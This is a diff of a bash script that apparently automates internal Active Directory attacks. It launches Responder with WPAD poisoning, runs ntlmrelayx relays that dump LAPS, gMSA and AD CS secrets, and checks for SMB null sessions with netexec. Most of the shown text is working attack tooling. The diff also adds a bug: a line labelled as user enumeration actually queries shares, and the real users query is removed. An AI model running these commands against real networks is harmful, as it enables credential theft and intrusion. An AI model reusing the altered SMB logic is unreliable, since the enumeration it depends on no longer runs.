@@ -436,9 +436,9 @@ relay () {
 		if [ -z "$proxychains" ];then
 			#Turn off SMB,HTTP and HTTPS server on Responder.conf file
 			responder_file="/usr/share/responder/Responder.conf"
-			sed -i '/^\s*SMB\s*=\s*On/s/= On/= Off/; /^\s*HTTPS\s*=\s*On/s/= On/= Off/; /^\s*HTTP\s*=\s*On/s/= On/= Off/' "$responder_file"
+			#sed -i '/^\s*SMB\s*=\s*On/s/= On/= Off/; /^\s*HTTPS\s*=\s*On/s/= On/= Off/; /^\s*HTTP\s*=\s*On/s/= On/= Off/' "$responder_file"
 			#Configure proxychains port 1080 (ntlmrelayx) and dynamic_chain (to have possibility of multiples socks)
-			responder_file="/etc/proxychains4.conf"
+			config_file="/etc/proxychains4.conf"
 			sed -i '/^strict_chain/s/^/#/' "$config_file"
 			sed -i '/^random_chain/s/^/#/' "$config_file"
 			sed -i '/^#.*dynamic_chain/s/^#//' "$config_file"
@@ -450,13 +450,13 @@ relay () {
 			fi
 			if  which terminator > /dev/null 2>&1;then
 				#terminator --new-tab -m -e "tail -F /root/test" &
-				terminator --new-tab -m -e "source /tmp/set_title_tab.sh Responder; responder -I ${INTERFACE} -bd --wpad --lm --disable-ess -v; sleep 5d" &
+				terminator --new-tab -m -e "source /tmp/set_title_tab.sh Responder; responder -I ${INTERFACE} -bd --wpad --disable-ess -v; sleep 5d" &
 				sleep 1
 				terminator --new-tab -m -e "source /tmp/set_title_tab.sh RelayNTLM; ntlmrelayx.py -tf $DIR_VULNS/NTLM_relay/ntlm-relay-list.txt -smb2support -socks --output-file $DIR_VULNS/NTLM_relay/ --dump-laps --dump-gmsa --dump-adcs; sleep 5d" &
 			else
 				#export QT_QPA_PLATFORM=offscreen 
 				#qterminal -e "tail -F $logfile" &
-				x-terminal-emulator -e "source /tmp/set_title_tab.sh Responder; responder -I ${INTERFACE} -bd --wpad --lm --disable-ess -v; sleep 5d" &
+				x-terminal-emulator -e "source /tmp/set_title_tab.sh Responder; responder -I ${INTERFACE} -bd --wpad --disable-ess -v; sleep 5d" &
 				sleep 1
 				x-terminal-emulator -e "source /tmp/set_title_tab.sh RelayNTLM; ntlmrelayx.py -tf $DIR_VULNS/ntlm-relay-list.txt -smb2support -socks --output-file $DIR_VULNS/NTLM_relay/ --dump-laps --dump-gmsa --dump-adcs; sleep 5d" &
 			fi
@@ -1096,9 +1096,10 @@ smb () {
 
 				#Anonymous / null session is allowed ?
 				$proxychains netexec --timeout $CME_TIMEOUT smb $ip -u '' -p '' --shares > ${DIR_VULNS}/smb/cme_${ip}_null_session_shares 2>/dev/null
-				if grep -aq '\[+\]' "${DIR_VULNS}/smb/cme_${ip}_null_session_shares" && ! grep -aq "STATUS_ACCESS_DENIED" "${DIR_VULNS}/smb/cme_${ip}_null_session_shares"; then
+				$proxychains netexec --timeout 30 smb $ip -u '' -p '' --shares > ${DIR_VULNS}/smb/cme_${ip}_null_session_users 2>/dev/null
+				if (grep -aq '\[+\]' "${DIR_VULNS}/smb/cme_${ip}_null_session_shares" && ! grep -aq "STATUS_ACCESS_DENIED" "${DIR_VULNS}/smb/cme_${ip}_null_session_shares") || grep -aq 'badpwdcount' "${DIR_VULNS}/smb/cme_${ip}_null_session_users"; then
+					green_log "${SPACE}${SPACE}[💀] Null session (anonymous) allowed"
 					if grep -qaE 'READ|WRITE' "${DIR_VULNS}/smb/cme_${ip}_null_session_shares"; then
-						green_log "${SPACE}${SPACE}[💀] Null session (anonymous) allowed"
 						green_log "${SPACE}${SPACE}[💀] Shares found -> ${DIR_VULNS}/smb/cme_${ip}_null_session_shares"
 						blue_log "${SPACE}${SPACE} [+] $proxychains smbmap -H ${ip} -r --depth 3 --exclude IPC$"
 					fi
@@ -1109,8 +1110,6 @@ smb () {
 					if [[ $(wc -l < "${DIR_VULNS}/smb/cme_${ip}_local_users.txt") -gt 0 ]]; then
 						green_log "${SPACE}${SPACE}[💀] New local users found -> ${DIR_VULNS}/smb/cme_${ip}_local_users.txt AND ${DIR}/users.txt"
 					fi
-					$proxychains netexec --timeout $CME_TIMEOUT smb $ip -u '' -p '' --users < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_null_session_users 2>/dev/null
-					## Injecter ces utilisateurs dans un fichier
 					
 					cat ${DIR_VULNS}/smb/cme_${ip}_null_session_users |grep -av '\[.\]' | grep -v "\-BadPW\-" | awk '{for(i=5;i<=NF;i++) printf $i" "; print ""}' | \
 							sed 's/.*\\//' |awk '{desc=""; for (i=4; i<=NF; i++) desc=desc " " $i; print $1 ":" desc}' | \
